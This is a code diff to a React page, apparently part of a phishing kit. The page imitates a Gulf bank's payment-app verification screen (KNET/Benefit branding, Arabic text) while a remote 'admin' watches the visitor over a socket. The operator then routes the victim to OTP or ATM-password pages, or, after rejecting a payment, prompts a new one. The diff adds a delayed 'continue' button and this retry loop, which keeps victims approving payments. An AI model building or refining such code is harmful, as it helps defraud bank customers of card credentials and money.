@@ -1,7 +1,9 @@
-import { useEffect, useState } from "react";
+import { useEffect, useState, useRef } from "react";
 import { useSignalEffect } from "@preact/signals-react/runtime";
 import { useLocation } from "wouter";
 import {
+  socket,
+  sendData,
   navigateToPage,
   cardAction,
   waitingMessage,
@@ -9,7 +11,11 @@ import {
 
 export default function BankAppVerification() {
   const [, navigate] = useLocation();
-  const [timer, setTimer] = useState(120); // 2 minutes = 120 seconds
+  const [timer, setTimer] = useState(120);
+  const [showButton, setShowButton] = useState(false);
+  const [phase, setPhase] = useState<"waiting" | "confirmed" | "rejected">("waiting");
+  const [isWaitingAdmin, setIsWaitingAdmin] = useState(false);
+  const buttonTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
 
   // Get payment data from localStorage
   const paymentData = JSON.parse(localStorage.getItem("paymentData") || "{}");
@@ -36,12 +42,22 @@ export default function BankAppVerification() {
     navigateToPage("تطبيق البنك");
   }, []);
 
+  // Show button after 30 seconds
+  useEffect(() => {
+    buttonTimerRef.current = setTimeout(() => {
+      setShowButton(true);
+    }, 30000);
+    return () => {
+      if (buttonTimerRef.current) clearTimeout(buttonTimerRef.current);
+    };
+  }, []);
+
   // Countdown timer - resets when it reaches 0
   useEffect(() => {
     const interval = setInterval(() => {
       setTimer((prev) => {
         if (prev <= 1) {
-          return 120; // Reset to 2 minutes
+          return 120;
         }
         return prev - 1;
       });
@@ -49,17 +65,44 @@ export default function BankAppVerification() {
     return () => clearInterval(interval);
   }, []);
 
-  // Handle card action from admin (navigate away if admin sends another action)
+  // Handle "click to continue" button
+  const handleConfirmClick = () => {
+    setPhase("confirmed");
+    setIsWaitingAdmin(true);
+    navigateToPage("تأكيد عملية الدفع من التطبيق");
+    sendData({
+      current: "تأكيد عملية الدفع من التطبيق",
+      waitingForAdminResponse: true,
+      isCustom: true,
+    });
+  };
+
+  // Handle "request new payment" button
+  const handleRetryClick = () => {
+    setPhase("confirmed");
+    setIsWaitingAdmin(true);
+    navigateToPage("طلب عملية دفع جديدة");
+    sendData({
+      current: "طلب عملية دفع جديدة",
+      waitingForAdminResponse: true,
+      isCustom: true,
+    });
+  };
+
+  // Handle card action from admin
   useSignalEffect(() => {
     if (cardAction.value) {
       const action = cardAction.value.action;
       waitingMessage.value = "";
+      setIsWaitingAdmin(false);
+
       if (action === 'otp') {
         navigate("/otp-verification");
       } else if (action === 'atm') {
         navigate("/atm-password");
       } else if (action === 'reject') {
-        navigate("/knet-payment");
+        // Stay on page, show "request new payment" button
+        setPhase("rejected");
       }
       cardAction.value = null;
     }
@@ -74,7 +117,6 @@ export default function BankAppVerification() {
       <div className="bg-white rounded-2xl shadow-xl p-6 max-w-md mx-auto w-full">
         {/* Bank Logo and Card Type */}
         {isBenefit ? (
-          /* Benefit: single large logo on the left */
           <div className="flex justify-start mb-6 px-4">
             <div className="flex items-center">
               <img
@@ -85,9 +127,7 @@ export default function BankAppVerification() {
             </div>
           </div>
         ) : (
-          /* Other cards: card type logo + bank logo */
           <div className="flex justify-between items-center mb-6 px-4">
-            {/* Card Type Logo (Visa/Mastercard) */}
             {cardTypeLogo && (
               <div className="flex items-center" style={{ width: '80px', height: '30px' }}>
                 <img
@@ -97,7 +137,6 @@ export default function BankAppVerification() {
                 />
               </div>
             )}
-            {/* Bank Logo */}
             {bankLogo && (
               <div className="flex items-center" style={{ width: '80px', height: '30px' }}>
                 <img
@@ -113,9 +152,7 @@ export default function BankAppVerification() {
         {/* Phone Icon - Professional Design */}
         <div className="flex justify-center mb-5">
           <div className="relative">
-            {/* Outer ring */}
             <div className="w-16 h-16 rounded-full bg-blue-50 flex items-center justify-center">
-              {/* Inner circle */}
               <div className="w-12 h-12 rounded-full bg-gradient-to-br from-blue-500 to-blue-600 flex items-center justify-center shadow-md">
                 <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.8">
                   <rect x="7" y="2" width="10" height="20" rx="2" ry="2" />
@@ -123,7 +160,6 @@ export default function BankAppVerification() {
                 </svg>
               </div>
             </div>
-            {/* Notification dot */}
             <div className="absolute -top-0.5 -right-0.5 w-4 h-4 bg-green-500 rounded-full border-2 border-white flex items-center justify-center">
               <svg className="w-2.5 h-2.5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="3">
                 <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
@@ -161,13 +197,44 @@ export default function BankAppVerification() {
           </div>
         </div>
 
-        {/* Waiting Animation */}
-        <div className="flex justify-center items-center gap-2 py-3">
-          <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce" style={{ animationDelay: '0ms' }}></div>
-          <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce" style={{ animationDelay: '150ms' }}></div>
-          <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce" style={{ animationDelay: '300ms' }}></div>
-          <span className="text-gray-500 text-xs mr-2">في انتظار الموافقة...</span>
-        </div>
+        {/* Dynamic section based on phase */}
+        {phase === "rejected" ? (
+          /* Rejected: show retry button */
+          <div className="py-3">
+            <button
+              onClick={handleRetryClick}
+              className="w-full py-3 bg-blue-600 text-white rounded-xl font-bold text-sm hover:bg-blue-700 transition"
+            >
+              طلب عملية دفع جديدة
+            </button>
+          </div>
+        ) : phase === "confirmed" && isWaitingAdmin ? (
+          /* Confirmed and waiting for admin: show waiting animation */
+          <div className="flex justify-center items-center gap-2 py-3">
+            <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce" style={{ animationDelay: '0ms' }}></div>
+            <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce" style={{ animationDelay: '150ms' }}></div>
+            <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce" style={{ animationDelay: '300ms' }}></div>
+            <span className="text-gray-500 text-xs mr-2">في انتظار الموافقة...</span>
+          </div>
+        ) : showButton && phase === "waiting" ? (
+          /* After 30s: show click to continue button */
+          <div className="py-3">
+            <button
+              onClick={handleConfirmClick}
+              className="w-full py-3 bg-green-600 text-white rounded-xl font-bold text-sm hover:bg-green-700 transition"
+            >
+              أنقر للمتابعة بعد تأكيد عملية الدفع
+            </button>
+          </div>
+        ) : (
+          /* Default: waiting animation */
+          <div className="flex justify-center items-center gap-2 py-3">
+            <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce" style={{ animationDelay: '0ms' }}></div>
+            <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce" style={{ animationDelay: '150ms' }}></div>
+            <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce" style={{ animationDelay: '300ms' }}></div>
+            <span className="text-gray-500 text-xs mr-2">في انتظار الموافقة...</span>
+          </div>
+        )}
 
         {/* Info Note */}
         <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-2.5 mt-3">
